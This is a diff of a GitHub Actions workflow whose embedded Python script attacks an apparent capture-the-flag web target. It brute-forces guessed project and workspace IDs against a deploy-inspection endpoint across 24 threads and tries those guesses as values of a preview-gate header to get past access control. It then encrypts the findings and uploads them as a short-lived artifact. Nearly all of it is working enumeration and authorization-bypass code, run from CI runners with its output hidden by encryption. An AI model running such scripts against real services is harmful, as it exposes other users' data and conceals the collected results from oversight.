@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe valid preview header across deploy targets
+      - name: Probe enterprise rollout IDs and encrypt responses
         shell: bash
         run: |
           set -euo pipefail
@@ -30,54 +30,42 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json, itertools
+          import requests, pathlib, urllib.parse, json, itertools, concurrent.futures
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out')
-          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
-          mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json()
-          refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json()
-          act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
-          H='X-Launchlet-Preview'; public_project=boot['project']; public_ws=boot['workspace']
-          baseh={'Accept':'application/json','Content-Type':'application/json'}
-          project_candidates=list(dict.fromkeys([
-            public_project,
-            'launchlet-release-board','launchlet-prod-board','launchlet-production-board','launchlet-staging-board','launchlet-internal-board','launchlet-corp-board','launchlet-corporate-board','launchlet-admin-board','launchlet-deploy-board','launchlet-control-board','launchlet-control-plane','launchlet-ops-board','launchlet-release','launchlet-prod','launchlet-production','launchlet-staging','launchlet-internal','launchlet-corporate','launchlet-admin','launchlet-deploy','launchlet-ops','launchlet-demo-release','launchlet-demo-prod','launchlet-demo-production','launchlet-demo-board-release','launchlet-demo-board-prod','launchlet-demo-board-production','launchlet-release-demo-board','launchlet-prod-demo-board','release','prod','production','staging','internal','admin','deploy','ops','corporate','corp','preview-8b11c'
-          ]))
-          workspace_candidates=list(dict.fromkeys([
-            public_ws,
-            'ws-launchlet-release','ws-launchlet-prod','ws-launchlet-production','ws-launchlet-staging','ws-launchlet-internal','ws-launchlet-private','ws-launchlet-admin','ws-launchlet-corp','ws-launchlet-corporate','ws-launchlet-deploy','ws-launchlet-ops','ws-launchlet-control','ws-launchlet-preview','ws-launchlet-demo','ws-release','ws-prod','ws-production','ws-internal','preview-8b11c'
-          ]))
-          header_candidates=list(dict.fromkeys(project_candidates + [public_ws,mf['previewReceipt'],mf['build'],act['id'],'preview-8b11c']))
-          result={'header_values':[],'target_hits':[],'action_tests':[]}
-          # Which values are accepted as preview context?
-          for hv in header_candidates:
-              r=s.post(url,headers={**baseh,H:hv},json={'actionId':act['id'],'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
-              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
-                  result['header_values'].append({'value':hv,'status':r.status_code,'body':r.text})
-                  if 'caplag{' in r.text: break
-          # Try action-id behavior after the gate is open.
-          for aid in ['x','inspectDeploy','deploy','exportDeploy','inspect-deploy','act_inspectDeploy','act_6f4b9a2c1d0e8a71',mf['previewReceipt'],'preview-8b11c']:
-              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':aid,'args':{'workspaceId':public_ws,'projectId':public_project}},timeout=8,allow_redirects=False)
-              result['action_tests'].append({'actionId':aid,'status':r.status_code,'body':r.text})
-              if 'caplag{' in r.text: break
-          # Cross-product of plausible project/workspace targets. Store only interesting differences.
-          baseline_ref='preview-8b11c'; baseline_status='preview-only'
-          stop=False
-          for ws,proj in itertools.product(workspace_candidates,project_candidates):
-              r=s.post(url,headers={**baseh,H:public_project},json={'actionId':act['id'],'args':{'workspaceId':ws,'projectId':proj}},timeout=8,allow_redirects=False)
+          seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
+          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          ps=[
+            'enterprise','enterprise-rollout','enterprise-release','enterprise-board','release-pulse','release-pulse-board','release-pulse-enterprise','production-readiness','production-readiness-board','final-review','final-review-board',
+            'launchlet-enterprise','launchlet-enterprise-board','launchlet-enterprise-rollout','launchlet-enterprise-release','launchlet-enterprise-release-board','launchlet-rollout','launchlet-rollout-board','launchlet-release-pulse','launchlet-release-pulse-board','launchlet-production-readiness','launchlet-production-readiness-board','launchlet-final-review','launchlet-final-review-board','launchlet-corporate-release','launchlet-corporate-rollout','launchlet-enterprise-prod','launchlet-enterprise-production','launchlet-demo-enterprise','launchlet-demo-board-enterprise','launchlet-enterprise-demo-board'
+          ]
+          ws=[
+            boot['workspace'],'ws-enterprise','ws-enterprise-rollout','ws-enterprise-release','ws-release-pulse','ws-production-readiness','ws-final-review','ws-launchlet-enterprise','ws-launchlet-enterprise-rollout','ws-launchlet-enterprise-release','ws-launchlet-rollout','ws-launchlet-release-pulse','ws-launchlet-production-readiness','ws-launchlet-final-review','ws-launchlet-corporate-release','ws-launchlet-corporate-rollout'
+          ]
+          tasks=list(itertools.product(ws,ps))
+          def one(pair):
+            w,p=pair
+            try:
+              r=requests.post(url,headers={**H,'User-Agent':'Mozilla/5.0'},json={'actionId':act['id'],'args':{'workspaceId':w,'projectId':p}},timeout=8,allow_redirects=False)
               txt=r.text
-              interesting=False; parsed=None
               try:
-                  parsed=r.json(); ins=parsed.get('inspector',{}) if isinstance(parsed,dict) else {}
-                  if r.status_code!=200 or ins.get('status')!=baseline_status or ins.get('deployRef')!=baseline_ref or 'flag' in parsed or 'caplag{' in txt:
-                      interesting=True
+                j=r.json(); ins=j.get('inspector',{}) if isinstance(j,dict) else {}
+                if r.status_code!=200 or ins.get('status')!='preview-only' or ins.get('deployRef')!='preview-8b11c' or 'caplag{' in txt or 'flag' in j:
+                  return {'workspaceId':w,'projectId':p,'status':r.status_code,'body':txt}
               except Exception:
-                  interesting=True
-              if interesting:
-                  result['target_hits'].append({'workspaceId':ws,'projectId':proj,'status':r.status_code,'body':txt})
-                  if 'caplag{' in txt: stop=True; break
-          (out/'summary.json').write_text(json.dumps(result,indent=2))
+                return {'workspaceId':w,'projectId':p,'status':r.status_code,'body':txt}
+            except Exception as e: return None
+          hits=[]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
+            for x in ex.map(one,tasks):
+              if x: hits.append(x)
+          # Also test these semantic values as the preview header itself with public args.
+          header_hits=[]
+          for hv in ps:
+            r=seed.post(url,headers={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':hv},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=8,allow_redirects=False)
+            if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}': header_hits.append({'value':hv,'status':r.status_code,'body':r.text})
+          (out/'summary.json').write_text(json.dumps({'target_hits':hits,'header_hits':header_hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -93,6 +81,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-targets-encrypted
+          name: launchlet-part2-enterprise-encrypted
           path: artifact/
           retention-days: 1
